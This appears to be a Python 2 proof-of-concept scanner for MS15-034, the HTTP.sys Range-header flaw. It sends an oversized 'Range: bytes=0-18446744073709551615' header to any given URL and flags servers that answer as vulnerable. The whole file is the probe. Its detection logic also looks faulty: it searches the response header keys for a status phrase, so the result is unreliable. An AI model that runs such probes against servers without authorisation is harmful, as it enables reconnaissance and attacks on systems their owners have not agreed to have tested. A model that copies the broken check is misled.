#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = w8ay
import requests
import urlparse

def poc(url):
    if '://' not in url:
        url = 'http://' + url
    try:
        header = dict()
        header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        header["Range"] = "bytes=0-18446744073709551615"
        r = requests.get(url, headers=header, timeout=5)
        if "Requested Range Not Satisfiable" in r.headers:
            return '[MS15-034]'+url
        else:
            return False
    except Exception:
        return False